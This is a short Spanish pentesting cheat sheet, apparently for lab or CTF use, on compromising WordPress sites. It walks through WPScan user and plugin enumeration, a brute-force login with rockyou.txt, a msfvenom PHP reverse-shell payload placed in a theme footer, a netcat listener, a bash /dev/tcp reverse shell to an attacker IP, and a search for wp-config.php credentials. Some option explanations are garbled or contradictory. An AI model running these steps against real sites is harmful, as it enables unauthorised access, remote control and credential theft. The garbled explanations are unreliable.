# WordPress

WordPress es uno de los CMS mas usados. Herramientas como WPScan permiten auditar su seguridad.

## Configurar /etc/hosts

Si la pagina se ve sin estilos (CSS roto), hay que mapear el dominio en `/etc/hosts`:

```bash
sudo nano /etc/hosts
<IP_objetivo> <dominio_wordpress>
```

## Enumeracion con WPScan

```bash
wpscan --url http://<IP>/blog --enumerate u,vp
```

- `u` -> Enumera usuarios
- `vp` -> Enumera plugins vulnerables

Para enumerar plugins de forma más específica.

```
wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection aggressive -t 100
```

- `-e p`-> enumerate plugins
- `--disable-tls-checks`->  skip TLS checks  
- `--plugins-detection passive`-> aset the plugin detection mode to passive 
- `-t 100`->  nd use 100 threads to speed up the enumeration. 
- `--plugin-detection aggressive`->  Alternatively, for more intensive plugin detection.
## Fuerza Bruta al Login

```bash
wpscan --url http://<IP>/<blog> --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

## Obtener Reverse Shell

Una vez dentro del panel de administracion:

1. Ir a **Appearance > Theme Footer**
2. Reemplazar el contenido con el payload generado:

```bash
msfvenom -p php/reverse_php LHOST=<IP_atacante> LPORT=<puerto> -f raw > pwned.php
```

3. Ponerse en escucha:

```bash
nc -nlvp <puerto>
```

4. Al guardar los cambios y recargar la pagina, se recibe la shell.

## Reverse Shell Adicional

La shell obtenida puede ser inestable, por lo que conviene enviar una segunda:

```bash
nc -nlvp <puerto>
bash -c "sh -i >& /dev/tcp/<IP_atacante>/4444 0>&1"
```


find /var -name 'wp-config.php' -type f 2>/dev/null

